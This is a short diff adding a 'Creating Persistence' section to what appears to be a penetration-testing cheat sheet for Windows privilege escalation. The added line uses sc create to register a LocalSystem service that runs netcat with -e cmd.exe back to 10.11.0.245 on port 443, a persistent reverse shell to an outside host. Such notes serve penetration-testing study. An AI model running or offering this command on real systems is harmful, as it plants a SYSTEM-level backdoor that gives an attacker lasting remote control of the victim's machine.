@@ -446,6 +446,11 @@ sc qc [service_name] (to verify!)
 sc start [service_name]
 ```
 
+#### Creating Persistence
+```
+sc create spotlessSrv binpath= "C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe" obj= "LocalSystem" password= ""
+````
+
 
 #### Port Forwarding / SSH Tunneling
 
